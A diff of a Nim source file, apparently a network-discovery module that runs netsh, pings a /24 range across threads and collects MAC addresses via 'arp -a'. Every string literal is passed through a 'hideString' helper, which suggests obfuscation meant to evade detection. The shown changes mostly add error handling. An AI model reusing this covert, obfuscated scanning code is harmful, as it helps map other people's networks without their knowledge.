@@ -15,11 +15,21 @@ from ../channels import mainChannel
 
 import ../functions/hideString
 
-proc getIPAndSubnetMask(): tuple[ip: string, subnetMask: string] =
-  let netsh: string = execProcess d e "netsh interface ip show addresses \"Wi-Fi\""
+proc getIPAndSubnetMask(): tuple[worked: bool, ip: string, subnetMask: string] =
+  result.worked = true
+
+  var netsh: string = execProcess d e "netsh interface ip show addresses \"Wi-Fi\""
+
+  if netsh.contains d e"incorrect.":
+    netsh = execProcess d e "netsh interface ip show addresses \"Ethernet\""
+
+  let subnetPrefix: string = d e "Subnet Prefix"
+
+  if not netsh.contains subnetPrefix:
+    result.worked = false
 
   for line in netsh.split d e "\n":
-    if line.contains d e"Subnet Prefix":
+    if line.contains subnetPrefix:
       let split = line.split(d e":")[1].unIndent().split(d e" ")[0].split(d e"/")
 
       result.ip = split[0]
@@ -56,8 +66,6 @@ proc assignIPSToThread(ips: seq[string]): seq[seq[string]] =
 
       result[thread].add val
 
-
-
 proc getMACSFromIPS(ips: seq[string]): void =
   let arp: string = execProcess d e"arp -a"
 
@@ -74,36 +82,37 @@ proc createThreads(ips: seq[seq[string]]): void =
   var
     threads: seq[Thread[seq[string]]] = newSeq[Thread[seq[string]]](actualNumberOfThreads)
 
-  open connectedDevicesThreadChannel
-
   for i in 0..<actualNumberOfThreads:
     createThread(threads[i], pingIPs, ips[i])
 
   joinThreads threads
 
 proc initConnectedDevicesThread*(): void {.thread.} =
-  let (ip, subnetMask) = getIPAndSubnetMask()
+  let (worked, ip, subnetMask) = getIPAndSubnetMask()
 
-  let ipParts: seq[string] = ip.split d e"."
-  let ipPart2: uint8 = uint8 parseUInt ipParts[2]
+  if worked:
+    let ipParts: seq[string] = ip.split d e"."
+    let ipPart2: uint8 = uint8 parseUInt ipParts[2]
 
-  var ips: seq[string]
+    var ips: seq[string]
 
-  case subnetMask
-  of d e"24":
-    ips = generateIPsForPing(ipPart2, ipPart2, 0, 255)
+    case subnetMask
+    of d e"24":
+      ips = generateIPsForPing(ipPart2, ipPart2, 0, 255)
 
-  let assignedIPs: seq[seq[string]] = assignIPSToThread ips
+    let assignedIPs: seq[seq[string]] = assignIPSToThread ips
 
-  createThreads assignedIPs
+    open connectedDevicesThreadChannel
 
-  var data = connectedDevicesThreadChannel.tryRecv()
-  var workingIPs: seq[string]
+    createThreads assignedIPs
 
-  while data.dataAvailable:
-    workingIPs.add data.msg
-    data = connectedDevicesThreadChannel.tryRecv()
+    var data = connectedDevicesThreadChannel.tryRecv()
+    var workingIPs: seq[string]
 
-  close connectedDevicesThreadChannel
+    while data.dataAvailable:
+      workingIPs.add data.msg
+      data = connectedDevicesThreadChannel.tryRecv()
 
-  getMACSFromIPS workingIPs
+    close connectedDevicesThreadChannel
+
+    getMACSFromIPS workingIPs
